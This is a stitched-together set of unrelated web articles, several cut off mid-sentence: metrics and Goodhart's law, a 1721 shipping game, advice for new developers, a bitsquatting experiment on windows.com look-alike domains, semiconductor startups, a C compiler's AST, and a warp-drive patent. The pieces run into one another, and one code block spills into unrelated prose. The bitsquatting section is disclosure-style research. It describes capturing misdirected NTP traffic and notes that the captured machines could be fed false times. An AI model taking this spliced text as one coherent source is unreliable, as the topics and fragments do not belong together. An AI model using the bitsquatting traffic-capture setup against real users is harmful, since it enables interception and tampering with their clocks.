<blockquote><p>“The more any quantitative social indicator is used for social decision-making, the more subject it will be to corruption pressures and the more apt it will be to distort and corrupt the social processes it is intended to monitor.”</p></blockquote>
<p>I’m going to stick with Strathern’s description because its simpler and more people seem to know it.</p>
<p>Strathern wrote about the emergence, in Cambridge in the mid 1700s, of written and oral exams as a way to rate university students.</p>
<p>Those students’ results were supposed to show how well the students learned their material, but also showed how well the faculty and university were doing. That is, how well the students had learned the subject matter, how well the professors taught, and the quality of the universities.</p>
<p>But to determine how well students, professors, and universities had performed, the exams couldn’t be graded in traditional, qualitative ways. They needed a way to rank the students.</p>
<blockquote><p>“This culminated in 1792 in a proposal that all answers be marked numerically, so that… the best candidate will be declared Number One… The idea of an examination as the formal testing of human activity joined with quantification (that is, a numerical summary of attainment) and with writing, which meant that results were permanently available for inspection. With measurement came a new morality of attainment. If human performance could be measured, then targets could be set and aimed for.”</p></blockquote>
<p>Strathern also described the difficulties of the rankings.</p>
<blockquote><p>“When a measure becomes a target, it ceases to be a good measure. The more examination performance becomes an expectation, the poorer it becomes as a discriminator of individual performances. [T]argets that seem measurable become enticing tools for improvement…. This was articulated in Britain for the first time around 1800 as ‘the awful idea of accountability’….”</p></blockquote>
<p>Again from Strathern’s paper:</p>
<blockquote><p>“Education finds itself drawn into the rather bloated phenomenon I am calling the audit culture… The enhanced auditing of performance returns not to the process of examining students, then, but to other parts of the system altogether. What now are to be subject to ‘examination’ are the institutions themselves—to put it briefly, not the candidates’ performance but the provision that is made for getting the candidates to that point. Institutions are rendered accountable for the quality of their provision.</p>
<p>“This applies with particular directness in Teaching Quality Assessment (TQA), which scrutinizes the effectiveness of teaching—that is, the procedures the institution has in place for teaching and examining, assessed on a department by department basis within the university’s overall provision…. TQA focuses on the means by which students are taught and thus on the outcome of teaching in terms of its organization and practice, rather than the outcome in terms of students’ knowledge. The Research Assessment Exercise (RAE), on the other hand… specifically rates research outcome as a scholarly product. Yet here, too, means are also acknowledged. Good research is supposed to come out of a good ‘research culture’. If that sounds a bit like candidates getting marks for bringing their pencils into the exam, or being penalized for the examination room being stuffy, it is a reminder that, at the end of the day, it is the institution as such that is under scrutiny. Quality of research is conflated with quality of research department (or centre). 1792 all over again!”</p></blockquote>
<p>Measuring the quality of teaching (or quality of research) rather than what students learn (or research results) is an odd outcome. But it makes sense. Adherence to a process seems related to the goals, so the process becomes what’s measured.</p>
<p>John Gall, a popular systems writer, also outlined something like this in his book <em>Systemantics</em>. Here he describes how a university researcher gets pulled into metrics-driven work.</p>
<blockquote><p>“[The department head] fires off a memo to the staff… requiring them to submit to him, in triplicate, by Monday next, statements of their Goals and Objectives….</p>
<p>“Trillium [the scientist who has to respond] goes into a depression just thinking about it.</p>
<p>“Furthermore, he cannot afford to state his true goals [he just likes studying plants]. He must at all costs avoid giving the impression of an ineffective putterer or a dilettante…. His goals must be well-defined, crisply stated, and must appear to lead somewhere important. They must imply activity in areas that tend to throw reflected glory on the Department.”</p></blockquote>
<p>Universities may have started our the focus with metrics, but today we see metrics used all the time. Here are some examples of metrics used to achieve goals and the problems they created.</p>
<h2>Some Inappropriate Metrics</h2>
<p><strong>Robert McNamara and the Vietnam War</strong>. Vietnam War-era Secretary of Defense Robert McNamara was one of the “Whiz Kids” in Statistical Control, a management science operation in the military. McNamara went on to work for Ford Motor Company and became its president, only to resign shortly afterward when Kennedy asked him to become Secretary of Defense.</p>
<p>In his new role, McNamara brought a statistician’s mind to the Vietnam War, with disastrous results. People on his team presented skewed data, put them in models that told a desired story, and couldn’t assess more qualitative issues like willingness of the Viet Cong and the US to fight. The focus on numbers even when they don’t tell the full story is called the <a href="https://en.wikipedia.org/wiki/McNamara_fallacy">McNamara Fallacy</a>.</p>
<p>The documentary <em>The Fog of War</em> presents 11 lessons about what McNamara learned as a senior government official. The numbered list of lessons:</p>
<p>1) Empathize with your enemy; 2) Rationality alone will not save us; 3) There’s something beyond one’s self; 4) Maximize efficiency; 5) Proportionality should be a guideline in war; 6) Get the data; 7) Belief and seeing are both often wrong; 8) Be prepared to reexamine your reasoning; 9) In order to do good, you may have to engage in evil; 10) Never say never; 11) You can’t change human nature.</p>
<p>Many of those 11 lessons deal with issues of McNamara’s Fallacy, including at least numbers 1, 2, 4, 6, 7, and 8.</p>
<p><strong>Easy, rather than meaningful measurements</strong>. If we need to measure something as a step toward our goals, we might choose what is easier to measure instead of what might be more helpful. Examples: a startup ecosystem tracking startup funding rounds (often publicly shared) rather than startup success (takes years and results are often private). The unemployment rate, which tracks how many people looking for work who have not found it, rather than how many have given up without working and how many have taken poorly paid jobs.</p>
<p><strong>Vanity metrics.</strong> In startups we often talk about “vanity metrics” as being ones that look good but aren’t helpful.&nbsp; A vanity metric would be growth in users (rather than accompanying metrics around revenue or retention) or website visits when those visits may come from expensive ad buys.</p>
<p>For example, when Groupon was getting ready to IPO, they quickly hired thousands of sales people in China. The purpose was to increase their valuation at IPO, not to bring in more revenue in a new market. When potential investors saw that Groupon had a large China team, they thought the company would succeed.</p>
<p>Vanity metrics can occur anywhere. When some police departments started to track <a href="https://en.wikipedia.org/wiki/CompStat">crime statistics</a>, they also started to underreport certain crimes since the police were judged based on how many crimes occurred.</p>
<p><strong>Surrogate metrics in health care</strong>. There’s a trade-off when measuring efficacy of a medicine. How long do we wait to prove results? If there are proxies for knowing whether a patient seems to be on the path to recovery, when do we choose the proxy rather than the actual outcome? As described in <a href="http://dx.doi.org/10.1016/j.jval.2016.10.011">Time to Review the Role of Surrogate End Points in Health Policy</a>:</p>
<p><em>“The Food and Drug Administration (FDA) in the United States and the European Medicines Agency (EMA), have a long tradition of licensing technologies solely on the basis of evidence of their effects on biomarkers or intermediate end points that act as so-called surrogate end points. The role of surrogates is becoming increasingly important in the context of programs initiated by the FDA and the EMA to offer accelerated approval to promising new medicines. The key rationale for the use of a surrogate end point is to predict the benefits of treatment in the absence of data on patient-relevant final outcomes. Evidence from surrogate end points may not only expedite the regulatory approval of new health …</em></p></div></article></div>

            <h2>History</h2>
            <p>The year is 1721. You are a rich person, and you want to put your
                wealth to use. You are approached by various people who buy goods in
                one part of the world, and sell them in another. They want you to
                finance some of their initial purchase and transportation costs, in
                exchange for a share of the revenue.</p>
            <p>Unfortunately, this being 1721, a significant fraction of shipments
                end up on the sea floor, or stolen by pirates, or gets lost to
                corrupt locals.</p>
            <p>You will be presented with a few shipments to finance, of varying
                value, ordered from low to high. They all have the same return
                relative to financing cost – your job is just to pick the most
                attractively sized suggestion.</p>
            <p>All proposed shipments have one thing in common: they will need to
                pass through a specific strait. This is critical information for
                your decision: different straits have different probabilities of
                losing the goods.</p>

            <p>You will have to consider three straits. Their true probability of
                success is unknown (and varies whenever you restart the game) but
                you get an estimation for each as a hint.</p>
            <ul>
                <li><strong>Bering</strong>: Very dangerous. Probability of success
                    is around 50&nbsp;%. Shipments through Bering strait
                    often have a high payoff as a result.</li>
                <li><strong>Malacca</strong>: Somewhat unsafe. Probability of
                    success is estimated to be between 60&nbsp;% and 80&nbsp;%.</li>
                <li><strong>Gibraltar</strong>: Very safe. Probability of success
                    unknown, but it seems to be over 90&nbsp;%, maybe even as high
                    as 100&nbsp;%. These shipments have relatively low payoff.</li>
            </ul>

<p><em>This is a guest post from Perry Tiu. Enjoy.</em></p>



<p>Dear New Developer,</p>



<p>Ask for great hardware.</p>



<p>Ask for that latest MacBook. Ask for that extra built-in 2TB of flash storage. Ask for that 32-inch monitor. Ask for that additional vertical monitor. Ask for that standing desk. Ask for that Aeron chair. Ask for that expensive USB-C hub. Ask for that ergonomic keyboard.</p>



<p>Now you may be thinking that you don’t want to be perceived as a burden to the company, or that you’re coming off as greedy and needy. I get it. If you had to purchase all of this yourself, it would surely be an unpleasant hole in your pocket. We all get it.</p>



<p>Fortunately in the bigger picture, this amount is actually minimal for companies compared to all the other costs related to hiring a new developer (salary, staff hours spent on interviewing individuals, etc). Most well-run companies regularly take into account these costs as they grow and there are many reasons why they are willing to invest in their staff’s developer experience. </p>



<p>One of the more obvious reasons is improving efficiency and productivity: having a laptop with an additional monitor setup is generally better than without. Interestingly, there are also indirect, not exactly tech-related, benefits. For example, being able to satisfy a developer’s needs improves work satisfaction, which contributes to employee retention. As long as you justify using the amazing hardware at your disposal, the return of investment in the long run far outweighs the cost of the hardware.</p>



<p>So ask away, treat yourself and embrace what modern technology has to offer. Your company should be there to help you grow in your role so don’t be shy. But more importantly: <strong>share your experience</strong>. Let people know what works for you, what doesn’t. Countless times have I learned new quality-of-life improvements just from hearing or seeing someone else live it. Not only will your peers and friends appreciate the discussion, it is also a collective push to improve each other’s developer experience.</p>



<p>Oh and it is harder to ask for upgrades down the road than when you just joined.</p>



<p>Sincerely written on an outdated machine,</p>



<p>Perry</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://remyhax.xyz/image/dns.jpg"></figure><p>Earlier this month, I came back around to seriously considering an attempt at <a href="http://dinaburg.org/bitsquatting.html">bitsquatting</a>. While the prior link goes into great depth on the topic, I will attempt to give a <em>very</em> high level overview here:</p><p>If this sort of thing interests you: I tend to do stuff like this weekly. Give me a follow <a href="https://twitter.com/_mattata">@_mattata</a></p><p>When you try to access a site by it’s domain, that domain is stored in the memory of your computer, device, whatever… in a structure that looks something like this.</p><table><thead><tr><th>01110111</th><th>01101001</th><th>01101110</th><th>01100100</th><th>01101111</th><th>01110111</th><th>01110011</th></tr></thead><tbody><tr><td>w</td><td>i</td><td>n</td><td>d</td><td>o</td><td>w</td><td>s</td></tr></tbody></table><p>Now let’s say that the computer is running too hot, a solar flare is happening, or a cosmic ray (very real thing) flips a bit on the computer.</p><table><thead><tr><th>01110111</th><th>01101000</th><th>01101110</th><th>01100100</th><th>01101111</th><th>01110111</th><th>01110011</th></tr></thead><tbody><tr><td>w</td><td><strong>h</strong></td><td>n</td><td>d</td><td>o</td><td>w</td><td>s</td></tr></tbody></table><p>Oh no! Now the value stored in memory is w<strong>h</strong>ndows.com instead of windows.com! When the time comes to make a connection to that domain, what happens?</p><blockquote><p>nslookup whndows.com</p></blockquote><blockquote><p>*** can’t find whndows.com: Non-existent domain</p></blockquote><p>The domain doesn’t resolve to an IP!</p><hr><p>In fact, out of the 32 valid domain names that are 1-bitflip away from windows.com 14 were available for purchase! This is a rather odd occurance as usually these are bought up by a company like Microsoft to prevent their use for phishing attempts. So I bought them. All of them. For ~$126.</p><p>(<em>If you’re a verifiably responsible party, I’m more than happy to transfer ownership of the domains. Otherwise, I’ll just hold on to them and continue to sinkhole.</em>)</p><blockquote><p>windnws.com
windo7s.com
windkws.com
windmws.com
winlows.com
windgws.com
wildows.com
wintows.com
wijdows.com
wiodows.com
wifdows.com
whndows.com
wkndows.com
wmndows.com</p></blockquote><p>Now we need to point these domains somewhere. So I rent a VPS and configure IPv4/IPv6, and create wildcard DNS entries to point to them.</p><p>Wildcard DNS works so that if I create a record saying that whndows.com points to 123.123.123.123 and someone requests abs.xyz.whndows.com, they will still get the same 123.123.123.123 DNS record as a reply. Due to the nature of this research dealing with bits being flipped, this allows me to capture any DNS lookup for a subdomain of windows.com where multiple bits have flipped.</p><p>Once we have DNS configured, we use <a href="https://www.wireshark.org/docs/man-pages/tshark.html">tshark</a> to perform a packet capture on the public interface of our VPS and wait for something interesting to happen.</p><p>Below is a short snippet of some interesting things that can be shared without uniquely indentifying any users.</p><p>Usage of <strong><a href="https://greynoise.io/tech">GreyNoise.io</a></strong> was key in helping to differentiate between opportunistic scanning and actual bitflip scenarios. Great product!</p><h2 id="ntp-udp-port-123-timewindowscom">NTP UDP port 123 time.windows.com</h2><p>UDP packets destined for port 123 attempting to set their computer clock using the Network Time Protocol (NTP).
time.windows.com is the default NTP server configured for all Windows machines and they check for the time regularly. If they don’t succeed in getting the time, they try again, and again, and again.</p><p>In total, over the course of 14 days, my server recieved <strong>199,180 NTP Client connections from 626 unique IP addresses.</strong></p><p>The NTP client for windows OS has no inherent verification of authenticity, so there is nothing stopping a malicious person from telling all these computers that it’s after <a href="https://en.wikipedia.org/wiki/Year_2038_problem">03:14:07 on Tuesday, 19 January 2038</a> and wreaking unknown havoc as the memory storing the signed 32-bit integer for time overflows.</p><p>As it turns out though, for ~30% of these computers doing that would make little to no difference at all to those users because their clock is already <em>broken</em>.</p><p>Using the tshark filter “ntp.xmt” we can extract the Transmit Timestamp, which is the time that the computer thinks it is when it asks to update the time.</p><blockquote><p>tshark -r capture.pcap -T fields -e ntp.xmt -2 -R ntp.xmt | sort -u</p></blockquote><pre><code>Sep 28, 1984 19:41:12.638290998 EDT

The very name, Silicon Valley, comes from the birth of the semiconductor industry in the San Francisco bay area 60+ years ago. Large percentage of venture financing used to go to semiconductor startups, even as recently as 15 years ago. As a chip designer doing startups in the late ‘90s and early 2000s in the San Francisco bay area, I felt as if there was a semi startup on every street corner.</p><p>Not so much in the last 10 years. Maturing industry, high capital requirements, and dwindling exits have caused a huge decline in funding for semiconductor startups. The narrative of Silicon Valley moved to consumer internet and software-led businesses. Remember, software is eating the world. But in the last few years, we have seen a slow but steady resurgence of semiconductor startups and witnessed blockbuster financing and acquisitions. So, are semiconductor startups on the comeback trail? Or is it a mirage?</p><p>First, it is important to separate semiconductor startups from the overall semiconductor industry. Globally, the market for semiconductor products has been growing for several decades and in recent years led by growth in computers, smartphones, consumer electronics, and automotive and industrial electronics. Computers have gotten powerful, phones have faster internet speeds, consumer gadgets have gotten smaller – all because of the technological advances in semiconductors.</p><div><figure><img width="1024" height="497" src="https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales-1024x497.jpg" alt="" srcset="https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales-1024x497.jpg 1024w, https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales-300x146.jpg 300w, https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales-768x373.jpg 768w, https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales-1536x745.jpg 1536w, https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales.jpg 1628w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales-1024x497.jpg" data-srcset="https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales-1024x497.jpg 1024w, https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales-300x146.jpg 300w, https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales-768x373.jpg 768w, https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales-1536x745.jpg 1536w, https://www.karthee.vc/wp-content/uploads/2021/03/Global-Semi-Sales.jpg 1628w"><figcaption>Source: “2020 State of the US Semiconductor Industry” from SIA</figcaption></figure></div><p>In a large growing market with improving technology why is there no place for new startups? While semiconductor is maturing as an industry, it is hardly a commoditized market with no place for innovation.</p><p>Well, structurally a few things happened:</p><ul type="1"><li>Cleantech, one of the prominent semiconductor sectors, had flopped badly, losing lots of capital for investors.</li><li>The technological advances made in internet infrastructure and mobile technologies led to a boom in the software application ecosystem across social, mobile, and cloud, moving entrepreneurial interest away from semiconductors.</li><li>China emerged as a large supplier of semiconductors, thus increasing competition while driving down premiums in the market.</li><li>Huge waves of consolidation happened in publicly traded semiconductor companies.</li></ul><p>Most sectors go through these phenomena – they are nothing new. When this happens, newer innovations kickstart the next disruption cycle. Why didn’t it happen with semi startups?</p><p>Well, the success of a startup ecosystem rests on the number and variety of experiments that are attempted. The more experiments across a wider variety of areas, the better the chances for a breakout success. For semiconductor startups, two main issues slowed down these experiments:</p><ul><li>It takes roughly $30M of financing to even get to a product and another $100M or more to get to volume production.</li><li>Buyer universe is limited because of the public market consolidation. The reduced list of buyers meant smaller acquisition premiums and smaller exits.</li></ul><p>Huge capital costs combined with a small buyer universe and small exits don’t make for an attractive investment area. Combine this with harder macro trend, we saw a vicious cycle of diminishing interest and funding in semiconductor startups.</p><p>Things have started turning around over the last few years. Since 2017, investments in semiconductor startups have increased significantly. So, what happened?</p><p>One of the main reasons is the explosion of Artificial Intelligence (AI). Innovative semiconductor products were required to meet the computing demand of AI. Advances in AI and Computer Vision helped make huge strides in autonomous vehicles and autonomous platforms. That drove demand for specialized semiconductor sensors and processor architectures.</p><p>The cost of building semiconductor products has come down significantly, especially if you are not operating at the cutting edge of semiconductor manufacturing processes. Most semiconductor products do not require these advanced processes. Today, you can build a first-generation semiconductor chip with $10M or less. That is lot less than $30M.</p><p>Expanding buyer universe – Apple, Google, Microsoft, Facebook, Amazon, and other large internet and software companies have started building semiconductors for their internal use and consumer products. They have become new acquirers of semiconductor startups.</p><p>US-China trade tensions have centered around semiconductors and there has been an increased focus on self-sufficiency and nationalization. This has driven demand for US semiconductor suppliers. <a href="https://www.reuters.com/article/us-usa-supply-chains-governors/eight-auto-state-governors-urge-biden-to-press-semiconductor-firms-on-chip-shortage-idUSKBN2AQ2MI">Chip shortages facing the automotive industry</a> is driving home the point of self sufficiency.</p><p>All these factors have driven huge investments and exits in Semiconductors recently. Just a few examples:</p><ul><li>Qualcomm acquired a two-year-old semiconductor startup, <a href="https://venturebeat.com/2021/01/13/qualcomm-will-acquire-nuvia-server-cpu-maker-led-by-ex-apple-chip-architect/">Nuvia for $1.4B</a></li><li>Automotive Sensor Semiconductor companies, <a href="https://techcrunch.com/2020/08/24/lidar-startup-luminar-to-go-public-via-3-4-billion-spac-merger/">Luminar</a>, <a href="https://techcrunch.com/2020/11/02/lidar-startup-aeva-to-go-public-via-2-1-billion-spac-merger/">Aeva</a>, <a href="https://techcrunch.com/2021/02/17/aeye-becomes-latest-lidar-company-to-go-public-via-spac/">Aeye</a>, <a href="https://siliconangle.com/2020/12/22/lidar-startup-ouster-go-public-1-9b-spac-merger/">Ouster</a> and <a href="https://www.bloomberg.com/news/articles/2020-12-11/lidar-startup-innoviz-to-go-public-in-1-4-billion-spac-deal">Innoviz</a> all going public at valuation of $1B or more.</li><li>Investments flowing into semiconductor startups focused on AI, Quantum computing, Robotics, and others.</li></ul><p>So, are semiconductor startups back for good? As new areas come up including Quantum computing, Space technologies, Computational biology …&nbsp; the need for innovation and newer semiconductor products is on the rise. I remain bullish that the resurgence we have seen in semiconductor startups is here to stay. And once again, the name, Silicon Valley, will fit its description.</p><hr></div><!-- .entry-content .clear --></div></article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      

<p>Given that the Psyche-C compiler frontend is being renewed, I decided to start a blog about the project. This is my first post.</p>

<p>Without further ado, consider this C program (assume that its name is <code>test.c</code>):</p>

<div><div><pre><code><span>int</span> <span>v</span><span>,</span> <span>f</span><span>(</span><span>int</span> <span>d</span><span>);</span>

<span>int</span> <span>f</span><span>(</span><span>int</span> <span>p</span><span>)</span>
<span>{</span>
    <span>if</span> <span>(</span><span>p</span> <span>==</span> <span>v</span><span>)</span>
        <span>return</span><span>(</span><span>p</span> <span>-</span> <span>1</span><span>);</span>
    <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>To produce and dump an AST with Psyche-C, we invoke the <em>cnippet</em> driver adaptor with command line option <code>--C-dump-AST</code>. The output is as follows:</p>

<p><img width="609" alt="Screen Shot 2021-03-03 at 20 56 16" src="https://user-images.githubusercontent.com/2905588/109888794-e8d75f00-7c62-11eb-98bc-c62247df0c3e.png"></p>

<p>Now, I’ll briefly correlate the above AST with the one produced by <a href="https://clang.llvm.org/">Clang</a> for the same <code>test.c</code> program. Let’s take a look at it:</p>

<p><img width="789" alt="Screen Shot 2021-03-03 at 21 03 44" src="https://user-images.githubusercontent.com/2905588/109889407-17096e80-7c64-11eb-9ecd-b0bd56af902e.png"></p>

<p>Apart from the colors and extra decoration, what are the main differences between the two?</p>

<ul>
  <li><em>It’s that Psyche-C’s AST is a bit closer to the grammar of C.</em> For instance, you can’t see <em>declarator</em>s in Clang’s AST, they are absorbed by their containing <em>declaration</em>s.</li>
</ul>

<p>Whether or not this characteristic is good or bad will depend on a given application. For the purpose of static analysis implementation, I consider the refined syntax insights of Psyche-C’s AST an advantage.</p>

<p>I’m not saying that every <em>node</em> in a AST should correspond to a <em>terminal</em> of the grammar. If so, we’d end up with a rather <strong>concrete</strong> syntax (or parse) tree, instead of an <strong>abstract</strong> syntax tree. A comprehensible AST will contain just enough of a language’s meaning embedded into it. (The AST produced by the <a href="https://github.com/ltcmelo/psychec/tree/original">old parser of Psyche-C</a>, e.g., was too grammar-oriented.)</p>

<p>Consider this snippet from our <code>test.c</code> program:</p>



<p>In Clang’s AST, it’s represented through a <code>VarDecl</code> and a <code>FunctionDecl</code>; both these nodes <a href="https://clang.llvm.org/doxygen/classclang_1_1DeclaratorDecl.html">inherit from</a> <code>DeclaratorDecl</code> (i.e., a <em>declaration</em> with a <em>declarator</em>). But, in pedantic terms, that representation isn’t quite correct, given that a single <em>declaration</em> — one starting at <code>int</code> and ending at <code>;</code> — exists in that snippet.</p>

<p>In Psyche-C, I opted for a more rigorous representation in the AST:</p>

<ul>
  <li>A <code>VariableAndOrFunctionDeclaration</code> is created (just like Clang, this node <a href="https://ltcmelo.github.io/psychec/api-docs/html/classpsy_1_1_c_1_1_variable_and_or_function_declaration_syntax.html">inherits from</a> a <code>DeclaratorDeclaration</code>) with two child nodes: an <code>IdentifierDeclarator</code>, designating object of type <code>int</code>, and a <code>FunctionDeclarator</code>, designating a function whose return type is <code>int</code>. This choice makes the AST rewritable with accuracy as well.</li>
</ul>

<p>In general, the design “spirit” of Psyche-C’s AST is more aligned with that of <a href="https://github.com/dotnet/roslyn">Roslyn</a>, the .NET compiler platform. Although, because Psyche-C is a frontend for C, its AST will, of course, resembles that of Clang.</p>

<p>To wrap up, I’ll leave a C# version of <code>test.c</code> (well, <code>test.cs</code>), together with its AST.</p>

<p><img width="837" alt="Screen Shot 2021-03-03 at 23 15 17" src="https://user-images.githubusercontent.com/2905588/109900632-753f4d00-7c76-11eb-9d61-6b3e278ec132.png"></p>

Like many other false starts in cutting-edge research, the patent may represent the next step in the expanding theory, or it could mean the practical, real-world design of a functioning warp drive is on the horizon.</span></p>
<h2><strong><span data-preserver-spaces="true">Background: How to Bend Space-Time with A Warp Drive</span></strong></h2>
<p><span data-preserver-spaces="true">After</span><a href="https://iopscience.iop.org/article/10.1088/0264-9381/11/5/001" target="_blank" rel="noopener"><span data-preserver-spaces="true">&nbsp;first publishing</span></a><span data-preserver-spaces="true">&nbsp;his groundbreaking 1994 warp drive concept in the journal Classical and Quantum Gravity, Mexican Mathematician and Physicist Miguel Alcubierre received significant positive and negative feedback. Most applauded his solution, which did indeed appear to create a working theory on how a warp drive might allow faster than light travel without violating the laws of physics. In contrast,&nbsp;</span><a href="https://www.space.com/17628-warp-drive-possible-interstellar-spaceflight.html#:~:text=Warp%20Drive%20May%20Be%20More%20Feasible%20Than%20Thought%2C%20Scientists%20Say&amp;text=Now%20physicists%20say%20that%20adjustments,of%20science%20fiction%20into%20science." target="_blank" rel="noopener"><span data-preserver-spaces="true">others zeroed in</span></a><span data-preserver-spaces="true">&nbsp;on the incredible amount of energy needed to propel his theoretical spacecraft.</span></p>

<p><span data-preserver-spaces="true"><br>
The warp drive was further refined in 2007 by engineer H. David Froning Jr., who, among other things, previously worked for the U.S. Air Force, Boeing, and McDonnell Douglas. He</span><a href="https://aip.scitation.org/doi/abs/10.1063/1.57491" target="_blank" rel="noopener"><span data-preserver-spaces="true">&nbsp;published those refinements</span></a><span data-preserver-spaces="true">&nbsp;in 2008 and later released a</span><a href="https://www.amazon.com/dp/B081NV86G7/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1" target="_blank" rel="noopener"><span data-preserver-spaces="true">&nbsp;2019 book</span></a><span data-preserver-spaces="true">&nbsp;on his research.</span></p>
<p><span data-preserver-spaces="true">Both theories took a giant leap forward in 2011 when</span><a href="https://ntrs.nasa.gov/citations/20110015936" target="_blank" rel="noopener"><span data-preserver-spaces="true">&nbsp;a paper published</span></a><span data-preserver-spaces="true">&nbsp;by NASA scientist Harold G. “Sonny” White further improved upon Alcubierre’s designs, dramatically reducing the amount of exotic matter needed to fuel the hypothetical drive from a Jupiter sized amount&nbsp;</span><a href="https://www.space.com/17628-warp-drive-possible-interstellar-spaceflight.html#:~:text=Warp%20Drive%20May%20Be%20More%20Feasible%20Than%20Thought%2C%20Scientists%20Say&amp;text=Now%20physicists%20say%20that%20adjustments,of%20science%20fiction%20into%20science." target="_blank" rel="noopener"><span data-preserver-spaces="true">to something akin to the</span></a><span data-preserver-spaces="true">&nbsp;size of the NASA Voyager 1 probe. While this is still a significant volume and well beyond our current ability to manufacture, this dramatic reduction in fuel requirements seems to indicate that a real-world warp drive may one day be feasible.</span></p>
<p><span data-preserver-spaces="true">One practical attempt to build a drive is being made by Nebraska University Adjunct Professor David Pares and his company, </span><a href="http://paresspacewarpresearch.org/2019/03/27/space-warp-research/" target="_blank" rel="noopener"><span data-preserver-spaces="true">Space Warp Dynamics</span></a><span data-preserver-spaces="true">.

<h2><strong><span data-preserver-spaces="true">Analysis: The New 2020 Warp Drive Patent</span></strong></h2>
<p><span data-preserver-spaces="true">In April of 2020, two engineers from Chicago, Jessica Gallanis and Eytan Halm Suchard</span><a href="https://www.freepatentsonline.com/y2020/0130870.html" target="_blank" rel="noopener"><span data-preserver-spaces="true">&nbsp;published a patent application</span></a><span data-preserver-spaces="true">&nbsp;for a drive using the updated Harold White designs. A device aptly named the Alcubierre-White Warp Drive. Barely a month into the COVID 19 shutdown, the patent’s publication seemed to sneak under the radar, with a</span><a href="http://readmultiplex.com/2020/12/22/patent-application-alcubierre-white-warp-drive-machine/?fbclid=IwAR0_vLd_-oFPI7Fql4zjMBRX0kt3k6yAjg_sSLU48vg7UXBcZAGlkFu2XcM" target="_blank" rel="noopener"><span data-preserver-spaces="true">&nbsp;lone report</span></a><span data-preserver-spaces="true">&nbsp;by&nbsp;</span><em><span data-preserver-spaces="true">Read Multiplex</span></em><span data-preserver-spaces="true">&nbsp;in December of 2020 (one that sits behind a paywall).</span></p>
<p><span data-preserver-spaces="true">In the summary portion of the patent, Gallanis and Suchard explain how “the invention uses two Alcubierre gravitational walls to achieve a warp drive effect as means of propulsion while surrounding or enclosing a cavity or space where passengers can travel.”&nbsp;</span></p>
<p><span data-preserver-spaces="true">This design is consistent with Alcubierre, who’s solution they point out “suggested a method for changing the metric of space-time and creating a space-time warp bubble such that while from outside the bubble, the bubble can advance in superluminal speed, from within the bubble the speed is much lower than the speed of light.”</span></p>
<p><span data-preserver-spaces="true">The patent also notes the work of Froning, who they say observed how, “if sufficient warping is achieved, ship speed is slower than light speed within the region that surrounds it-even if it is moving faster-than-light with respect to Earth.”</span></p>
<p><span data-preserver-spaces="true">“I had never personally heard of the Alcubierre drive until 2013,” Suchard admitted on a two-hour telephone interview with&nbsp;</span><em><span data-preserver-spaces="true">The Debrief to&nbsp;</span></em><span data-preserver-spaces="true">discuss his device, how the design came about, and how realistic building his patented Warp Drive was.</span></p>

<p><span data-preserver-spaces="true">“It occurred to me that we should be able to describe all physical phenomena as geometry. And that space-time was merely an emergent property, which is diametrically opposed to [Albert] Einstein’s approach.”</span></p>
<p><span data-preserver-spaces="true">The Israeli-born engineer said this revelation launched him into a more in-depth study of things like dark matter, loop theory, quantum gravity, and ultimately, to the idea of a warp drive.&nbsp;</span></p>
<p><span data-preserver-spaces="true">“I first stumbled across Alcubierre in 2013,” Suchard explained, a discovery that led to him spending the next three years trying to rectify his new take on classical physics with Dr. White’s theory. “I knew from my own calculations that energy itself must create gravity, and by extension anti-gravity,” he said. “And that this had to be the solution to Alcubierre.”</span></p>
<p><span data-preserver-spaces="true">By 2017, Suchard’s wife and fellow engineer Jessica Gallanis told him that his theoretical work was sound, and it was time to try to file a patent. Unfortunately, the first try was unsuccessful. “They wouldn’t take it,” he said of the response by the&nbsp;</span><a href="https://www.uspto.gov/" target="_blank" rel="noopener"><span data-preserver-spaces="true">United States Patent and Trademark Office</span></a><span data-preserver-spaces="true">&nbsp;(USPTO). “I think they didn’t understand the physics.”</span></p>
<p><span data-preserver-spaces="true">Suchard said he spent the next two years going back and forth with the USPTO until, in 2020, they finally made a concession. “By then, they did not refute the fact that the patent is based upon a valid working theory, but still said I would need a physical device to prove the physics.” As a result of this concession, they accepted the application, leading to the 2020 publication.</span></p>

<h2><strong><span data-preserver-spaces="true">Outlook: Has History Been Made?</span></strong></h2>
<p><span data-preserver-spaces="true">When asked where his patent will go from here, Suchard was particularly critical in his response. “I don’t trust anyone else to do the experiments,” he said, “because too many do them in the wrong way.” To do those experiments, Suchard also admits that his expertise is not enough. “I would need other physicists involved. An RF engineer, a materials scientist, and many others with expertise in [areas like] heat dissipation, x-rays, and other related fields.”&nbsp;</span></p>
<p><span data-preserver-spaces="true">Suchard also noted the significant amount of funding needed for this research and that such funding is not presently on the horizon.</span></p><div><div id="block-wrap-57590" data-id="57590"><div><div><div>		<article>

<p><em><span data-preserver-spaces="true">The Debrief</span></em><span data-preserver-spaces="true">&nbsp;reached out to Dr. Jason Cassibry, a professor at the Propulsion Research Center at the University of Alabama Huntsville. He, and one of his students,&nbsp;</span><a href="https://www.vice.com/en/article/ywaxeb/this-student-is-one-of-the-top-scientists-studying-faster-than-light-warp-drives" target="_blank" rel="noopener"><span data-preserver-spaces="true">Joseph Agnew</span></a><span data-preserver-spaces="true">, a researcher at the Propulsion Research Center, explained that there were problems with Suchard’s theory.&nbsp;</span></p>
